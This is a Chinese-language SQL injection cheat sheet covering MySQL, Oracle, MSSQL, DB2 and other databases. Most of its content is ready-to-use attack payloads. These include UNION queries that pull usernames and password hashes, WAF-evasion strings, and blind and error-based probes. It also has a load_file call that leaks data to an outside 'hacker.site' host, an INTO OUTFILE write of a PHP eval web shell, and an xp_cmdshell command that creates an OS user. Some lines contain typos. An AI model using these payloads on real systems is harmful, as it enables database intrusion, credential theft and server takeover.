# SQLinjection

## 查明SQL注入漏洞

### 1. 注入字符串数据

1. `'`
2. `''`
3. [良性输入]

`'||'FOO`

> oracle

`'+'FOO`

> ms-sql

`' 'FOO`

> mysql

### 2. 注入数字数据

1. 原始值为2 可尝试`1+1`或`3-1`
2. `67-ASCLL('A')` 结果为2
3. `52-ASCLL(1)` 结果为2(没有单引号)

### 3. [注入查询结构]

1. 记下任何可能控制应用程序返回的结果的顺序或其中的字段类型参数
2. 提供一系列在参数值中提交数字值得请求 从数字1开始 然后逐个请求递增。如果更改输入中的数字会影响结果的顺序 则说明输入可能被插到ORDER BY子句中。如果提交的数字大于结果集中的列数 查询将会失败。如果提交数字1生成一组结果 其中一个列的每一行都包含一个1 则说明输入可能被插入到查询返回的列的名称中。

## union

1. null  
`' union select null--`  
`' union select null, null--`  
`' union select null, null, null--`
2. 替换字符串  
`' union select 'a', null, null--`  
`' union select null, 'a', null--`  
`' union select null, null, 'a'--`

> oracle中每个`select`语句必须包含一个`FROM`属性 因此 无论列数是否正确 注入`union select null`讲产生一个错误 可以选择使用全局可访问表(globally accessible table)DUAL来满足这一要求 例如：`' union select null from dual--`

查版本:

`' union select @@version, null, null--`

> ms-sql mysql

`'union select banner, null, null from v$version--`

`'union all select banner, null, null from v$version--`

> oracle

## 提取数据

1. 查询元数据表`information_schema`  

表名

`union select group_concat(table_name) from information_schema.tables where table_schema=database()`

字段名

`union select group_concat(column_name) from information_schema.columns where table_name=[table_name]`

数据

`union select concat(0x2b,username,0x2b,password) from [table_name]`

> 适用于ms-sql mysql

2. 在分析大型数据库以探查攻击目标时 最好是查找有用的列名称 而不是表 如:  
`' union select tables_name,column_name,null,null from information.schema where columns_name LIKE '%PASS%'`

## 避开过滤

1. ASCLL替换  
`select ename,sal from emp where enam'marcus'` 如下与左等同:  
`select ename,sal from emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)`

> oracle

或

`select ename,sal from emp where ename=CHR(109)+CHR(97)+CHR(114)+CHR(99)+CHR(117)+CHR(115)`

> mssql

2. 避免使用简单确认  
`SeLeCt`  
`%00SELECT`  
`SELSELECTCT`  
`%53%45%4C%45%43%54`  
`%2553%2545%254C%2545%2543%2554`

SQLi Filter Evasion Cheat sheet

```
#注释
' or 1=1#
' or 1=1/* (MySQL < 5.1)
' or 1=1;%00
' or 1=1 union select 1,2 as `
' or#newline
' /*!50000or*/1='1
' /*!or*/1='1

#前缀
+ – ~ !
' or –+2=- -!!!'2

#操作符：
^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL

#空格
%20 %09 %0a %0b %0c %0d %a0 /**/
'or+(1)sounds/**/like"1"–%a0-
'union(select(1),tabe_name,(3)from`information_schema`.`tables`)#

#有引号的字符串
SELECT 'a'
SELECT "a"
SELECT n'a'
SELECT b'1100001′
SELECT _binary'1100001′
SELECT x'61′

#没有引号的字符串
　'abc' = 0×616263
　　' and substr(data,1,1) = 'a'#
　　' and substr(data,1,1) = 0x61 # 0x6162
　　' and substr(data,1,1) = unhex(61)    # unhex(6162)
　　' and substr(data,1,1) = char(97  )# char(97,98)
　　' and substr(data,1,1) = 'a'#
　　' and hex(substr(data,1,1)) = 61#
　　' and ascii(substr(data,1,1)) = 97#
　　' and ord(substr(data,1,1)) = 97# 
　　' and substr(data,1,1) = lower(conv(10,10,36))# 'a'

#别名
select pass as alias from users
select pass`alias alias`from users

#字型
' or true = '1 # or 1=1
' or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
' or '1 # or true
#操作符字型
select * from users where 'a'='b'='c'
select * from users where ('a'='b')='c'
select * from users where (false)='c'

#认真绕过'='
select * from users where name = "="
select * from users where false = "
select * from users where 0 = 0
select * from users where true#函数过滤器ascii (97)
load_file/*foo*/(0×616263)

#用函数构建字符串
'abc' = unhex(616263)
'abc' = char(97,98,99)
 hex('a') = 61
 ascii('a') = 97
 ord('a') = 97
'ABC' = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))

#特殊字符
　　aes_encrypt(1,12) // 4鏷眥"^z譎é蒃a
　　des_encrypt(1,2) // 侴Ò/镏k
　　@@ft_boolean_syntax // + -><()~*:""&|
　　@@date_format // %Y-%m-%d
　　@@innodb_log_group_home_dir // .\

@@new: 0
@@log_bin: 1
#提取子字符串substr('abc',1,1) = 'a'
substr('abc' from 1 for 1) = 'a'
substring('abc',1,1) = 'a'
substring('abc' from 1 for 1) = 'a'
mid('abc',1,1) = 'a'
mid('abc' from 1 for 1) = 'a'
lpad('abc',1,space(1)) = 'a'
rpad('abc',1,space(1)) = 'a'
left('abc',1) = 'a'
reverse(right(reverse('abc'),1)) = 'a'
insert(insert('abc',1,0,space(0)),2,222,space(0)) = 'a'
space(0) = trim(version()from(version()))

#搜索子字符串
locate('a','abc')
position('a','abc')
position('a' IN 'abc')
instr('abc','a')
substring_index('ab','b',1)

#分割字符串
length(trim(leading 'a' FROM 'abc'))
length(replace('abc', 'a', "))

#比较字符串
strcmp('a','a')
mod('a','a')
find_in_set('a','a')
field('a','a')
count(concat('a','a'))

#字符串长度
length()
bit_length()
char_length()
octet_length()
bit_count()

#关键字过滤
Connected keyword filtering
(0)union(select(table_name),column_name,…
0/**/union/*!50000select*/table_name`foo`/**/…
0%a0union%a0select%09group_concat(table_name)….
0′union all select all`table_name`foo from`information_schema`. `tables`

#控制流
case 'a' when 'a' then 1 [else 0] end
case when 'a'='a' then 1 [else 0] end
if('a'='a',1,0)
ifnull(nullif('a','a'),1)
```

测试向量

```
%55nion(%53elect 1,2,3)-- -

+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinctROW+select+
-15+(uNioN)+(sElECt)
-15+(UnI)(oN)+(SeL)(ecT)+

id=1+UnIOn/**/SeLect 1,2,3—
id=1+UNIunionON+SELselectECT 1,2,3—
id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—
id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—
id=1+un/**/ion+sel/**/ect+1,2,3--
id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3
id=1+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
id=1+/**/union/*&id=*/select/*&id=*/1,2,3--
id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x

/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
/*!union*/+/*!select*/+1,2,3—
/*!UnIOn*//*!SeLect*/+1,2,3—
un/**/ion+sel/**/ect+1,2,3—
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WHERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--

?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,
?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--
id=1/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/

id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES-- 
id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--

SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);
SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) in xml way

select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42

/?id=1+union+(select'1',concat(login,hash)from+users)
/?id=(1)union(((((((select(1),hex(hash)from(users))))))))

?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ net user lucifer UrWaFisShiT /*&id=1*/ --
id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
id=10 and 1=0/(select top 1 table_name from information_schema.tables)

id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log中的请求
```

### 7.注释

1. `#` mysql
2. `--` oracle mysql mssql
3. `/**/` oracle mysql mssql


## DB2

当前用户名长度

`1 and 8=(select length(user) from sysibm.sysdummy1) --`

当前用户名 ASCLL 48-122

`1 and 1=(select ASCII(SUBSTR(user, 1, 1)) from sysibm.sysdummy1)`

当前数据库名长度

`1 and 6 = (select length(current server) from sysibm.sysdummy1)`

当前数据库名

`1 and 1=(select ASCII(SUBSTR(current server, 1, 1)) from sysibm.sysdummy1)`

## MYSQL

#### 数据库名

`union select 1,2,3,4,database()#`

#### 表名

`union select 1,2,3,4,group_concat(table_name) from information_schema.tables where table_schema=database()#`

盲注表名长度

`1’ and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=1 #`

盲注表名

`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 #`

#### 字段名

`union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name='[表名]'#`

#### GET数据

`union select 1,2,3,group_concat([字段名1],[字段名2],[字段名3]...),group_concat([字段名4]...) from [表名]#`

#### 绕过

`/*!50000select*/`

#### 带外通道

SQL注入读写文件的根本条件：

* 数据库允许导入导出（secure\_file\_priv）

`show variables like "secure_file_priv";`

* 当前用户用户是否有文件读写权限（File\_priv）

`select File_priv from mysql.user where user='root' and host='localhost';`

查看当前用户

`select current_user();`

|    secure\_file\_priv    |                含义               |
|:------------------------:|:---------------------------------:|
|`secure_file_priv=null`   |限制mysql不允许导入导出               |
|`secure_file_priv=/tmp/`  |限制mysql的导入导出只能发生在`/tmp/`目录|
|`secure_file_priv=''`     |不对mysql的导入导出做限制             |

读写条件

1. 对web目录具有读写权限

2. 知道文件绝对路径

3. 能够使用联合查询（sql注入时）

##### 读文件 

`load_file()`

> `load_file('/etc/passwd')`  
> `concat()`函数用于将多个字符串连接成一个字符串

```
select load_file(concat('\\',version(),'.hacker.site\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
?id=-1' UNION SELECT 1,2,load_file('c:\\boot.ini')--+
?id=-1' UNION SELECT 1,2,load_file(char(99,58,47,98,111,111,116,46,105,110,105))--+ //通过char()函数将ascii十进制形式转为字符形式，可绕过引号过滤
?id=-1' UNION SELECT 1,2,load_file(0x633a2f626f6f742e696e69)                //十六进制形式
```

##### 写文件

前提条件 

* 目标目录要有可写权限
* 当前数据库用户要有FILE权限
* 目标文件不能已存在
* `secure\_file\_priv`的值为空
*  路径完整

`SELECT...INTO OUTFILE`

```
SELECT <?php @eval($_POST['sb'])?> INTO OUTFILE ".........";           //outfile后的文件路径不能用十六进制或配合char()来实现，只能用引号这种形式
?id=-1' UNION SELECT 1,2,(select load_file('c:\\boot.ini')）INTO OUTFILE "c:\\test\\aaa.txt"--+
```


## ORACLE

#### 类型判断

`||` oracle中独有的链接符号

#### 系统表

`user_tab_columns` 本用户的表,视图等

`all_tab_columns` 所有用户的表,视图等

`all_tables` 所有用户的表

`user_tables` 本用户的表

`table_name` 系统里的表名

`column_name` 系统里存在的列名

这里也有个小技巧 我们可以通过查询系统表来找找敏感字段如`PASSWORD`在哪些表中(**列名要用大写表示**)

`select count(*) from user_tab_columns where column_name like '%25PASSWORD%25'`

查询包含`PASSWORD`的表中的任意1个表==>`limit=2`

`select chr(126)||chr(39)||data||chr(39)||chr(126) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%PASSWORD%') where limit =2`

获取列名

`select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=chr(70)||chr(71)||chr(87)||chr(49)||chr(48)||chr(49)||chr(84)) whEre limit =1`

获取内容

`Select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,PASSWORD||chr(35)||id||chr(35)||PASSWORD||chr(35)||NAME||chr(35)||IN_DATE||chr(35)||UP_DATE as data from FGW101T`

#### 系统函数

`count()` 返回匹配的行数  返回指定列数值的和

`utl_http.request()`

`utl_inaddr.get_host_address()` **本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。** 可以利用这个函数进行报错 但也同样会执行里面的语句返回 如: `utl_inaddr.get_host_address`函数会报错 但里面的`select`语句同样会执行且一并和报错返回

`1' or 1=utl_inaddr.get_host_address((select banner from sys.v_$version where rownum=1))--`

#### 绕过

`/%23%0a/` 空格

`<script>` 前提是`<script>`会被服务器删掉 绕过单词限制 如:

`select banner from sys.v_$version where rownum=1` ==>

`sel<script>ect/*%23%0a*/banner/*%23%0a*/fro<script>m/*%23%0a*/sys.v_$version/*%23%0a*/where/*%23%0a*/rownum=1`

#### 语句

`select * from session_roles` 当前用户权限

`select banner from sys.v_$version where rownum=1` 当前数据库版本

`select utl_inaddr.get_host_address from dual` 服务器监听IP

`select member from v$logfile where rownum=1` 服务器操作系统

`select instance_name fromv$instance;` 服务器sid (远程连接的话需要)

`select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual` 当前连接用户

## MSSQL

绕过

`se%le%ct`

## Sybase



## 盲注

```
Booleanbase
Timebase
Errorbase
```

#### 函数

`length()`获取长度

exp: `length('PASSWORD')` ==> `8`

`substr()` 截取字符串

exp: `substr('PASSWORD',1,2)` ==> `PA`

> 从1(0等同1)开始取2个

`ascii()` 返回字符的ascii码

可打印ascii码 从 `32`-`127`

exp: `ascii(substr('PASSWORD',1,1))` ==> `80`

`sleep()` 挂起

`if(expr1,expr2,expr3)` 如果`expr1`为真 则`expr2` 否则`expr3`

## 各数据库确认特征

H2

`admin' AND ZERO() IS 0 AND 'Bhmw'='Bhmw`

Mysql

`admin' AND QUARTER(NULL) IS NULL AND 'WcHB'='WcHB`

Oracle

`admin' AND LENGTH(SYSDATE)=LENGTH(SYSDATE) AND 'uXbw'='uXbw`

PostgreSQL

`admin' AND QUOTE_IDENT(NULL) IS NULL AND 'zJZp'='zJZp`

Microsoft Sql Server

`admin' AND UNICODE(SQUARE(NULL)) IS NULL AND 'ifwo'='ifwo`

SQLite

`admin' AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID() AND 'PAGa'='PAGa`

Microsoft  Access

`admin' AND VAL(CVAR(1))=1 AND 'GCof'='GCof`

Firebird

`admin' AND (SELECT COUNT(*) FROM RDB$DATABASE WHERE 4626=4626)>0 AND 'gAtU'='gAtU`

SAP MaxDB

`admin' AND ALPHA(NULL) IS NULL AND 'buDg'='buDg`

Sybase

`admin' AND @@transtate=@@transtate AND 'CVzH'='CVzH`